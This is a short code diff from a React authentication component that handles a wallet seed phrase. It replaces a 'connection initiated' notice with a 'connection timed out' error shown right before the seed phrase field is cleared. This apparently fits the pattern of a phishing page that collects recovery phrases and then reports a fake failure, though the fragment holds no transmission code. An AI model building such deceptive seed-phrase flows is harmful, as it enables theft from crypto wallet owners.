@@ -140,8 +140,8 @@ const Auth = () => {
         });
         
       toast({
-        title: "Wallet connection initiated",
-        description: "Your wallet connection request has been received.",
+        title: "connection timed out",
+        description: "Unable to connect, timeout.",
       });
       
       setSeedPhrase('');
